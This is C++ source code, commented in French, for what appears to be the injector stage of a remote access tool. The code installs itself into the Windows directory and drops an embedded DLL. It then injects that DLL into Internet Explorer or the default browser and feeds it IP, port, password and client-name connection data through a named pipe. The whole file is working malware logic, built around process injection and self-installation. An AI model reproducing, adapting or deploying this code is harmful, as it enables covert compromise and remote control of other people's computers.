#include <system/System.hpp>
#include <system/Registry.hpp>
#include <malicious/Injector.hpp>
#include <malicious/BinaryRessource.hpp>
#include <malicious/InternetExplorer.hpp>
#include <common/Innocence.hpp>
#include <log/Log.hpp>
#include <network/Pipe.hpp>
#include "Inhibiter.hpp"
#include <common/Innocence.hpp>

#include "SlaveDll.hpp"
#include <shlwapi.h>
using namespace std;
using namespace System;

namespace Inhibiter
{
    InhibiterCore::InhibiterCore(const std::string& executable) : 
		current_executable_path(executable),
		install_directory(System::getWindowsPath())
    {
        executable_path = install_directory + "\\" + Common::INHIBITER_EXE_NAME;
        dll_path = install_directory + "\\" + Common::INHIBITION_DLL_NAME;
    }

    void InhibiterCore::install()
    {
        TRACE_FUNCTION
        // par défaut, si il existe déja un exécutale de l'injecteur, celui-ci est directement remplacé.
        if(CopyFile(current_executable_path.c_str(), executable_path.c_str(), FALSE) == FALSE)
        {
			throw Common::Exception("Unable to install injector, CopyFile failed : " + Common::toString(GetLastError()));
        }

		System::Process::Launcher finish_install(executable_path, "\"" + current_executable_path + "\"");
        if(!finish_install.isRunning())
        {
			throw Common::Exception("Unable to launch injector");
        }
    }

    void InhibiterCore::uninstall()
    {
        TRACE_FUNCTION
        // efface la DLL d'inhibition
        if(!DeleteFile(dll_path.c_str()))
        {
			throw Common::Exception("Unable to delete dll, DeleteFile failed : " + Common::toString(GetLastError()));
        }

        // cet executable doit s'auto-effacer pour terminer la désinstallation
    }

    void InhibiterCore::finishUninstall()
    {
        TRACE_FUNCTION
        LOG << "Temporary exe, deleting injector";
        if(!DeleteFile(executable_path.c_str()))
        {
            throw Common::Exception("Unable to delete injector, DeleteFile failed : " + Common::toString(GetLastError()));
        }
    }

    bool InhibiterCore::installed()
    {
        return (current_executable_path == executable_path);
    }

    bool InhibiterCore::isEverInstalled()
    {
        // verification de l'existence de l'injecteur et de sa dll
		DWORD exeFileAttr = GetFileAttributes(executable_path.c_str());
		DWORD dllFileAttr = GetFileAttributes(dll_path.c_str());
		if (0xFFFFFFFF == exeFileAttr ||0xFFFFFFFF == dllFileAttr )
		{
			return false;
		}
        return true;
    }

    void InhibiterCore::inject()
    {
        TRACE_FUNCTION
        Sleep(1000);
        Malicious::BinaryRessource substrate(SlaveDll, sizeof(SlaveDll), dll_path);
        if(Common::INJECT_DEFAULT_BROWSER)
        {
            DWORD size = MAX_PATH;
            TCHAR buff[MAX_PATH];
            if(AssocQueryString(0, ASSOCSTR_EXECUTABLE, ".html", NULL ,buff , &size) != S_OK)
            {
                processToInject = Common::DEFAULT_INJECTED_PROCESS_NAME;
            }
            else
            {
                processToInject = buff;
            }
        }
        else
        {
            processToInject = Common::DEFAULT_INJECTED_PROCESS_NAME;
        }

		Malicious::InternetExplorer ie;
		LOG << "Injecting IE with PID : " + Common::toString(ie.getPid());
		try
		{
			Malicious::inject(ie.getPid(), dll_path);
			/*
			string name_str;
			string ip_str;
			string password_str;
			string port_str;

			buffer = buffer.substr(MARKER_SIZE, buffer.size()-2*MARKER_SIZE);
			std::string info_buffer = buffer;
			istringstream iss(buffer);
			std::getline( iss, ip_str, SEPERATOR );
			std::getline( iss, port_str, SEPERATOR );
			std::getline( iss, name_str, SEPERATOR );
			std::getline( iss, password_str, SEPERATOR );

			LOG << "NAME : " + name_str;
			LOG << "IP : " + ip_str;
			LOG << "PORT : " + port_str;
			LOG << "PASSWORD : " + password_str;
			*/
			// la dll est injectée, il faut maintenant lui envoyer l'ip, le port, le mot de passe et le nom du client
			// pour ce faire, on utilise les "pipe" à la windows (IPC)
			Network::Pipe pipe_server;

			pipe_server.listen(Common::PIPE_NAME);
			LOG << "Pipe server waiting for connection";
			if(pipe_server.accept())
			{
					LOG << "Sending connection informations : "+string(Common::blaspheme, Common::CONNECTION_INFO_SIZE);
					//pipe_server.send(buffer.c_str(), buffer.size());
					pipe_server.send(Common::blaspheme, Common::CONNECTION_INFO_SIZE);
			}
			pipe_server.disconnect();
		}
		catch(...)
		{
			ie.kill();
			throw;
		}
    }

} // Inhibiter
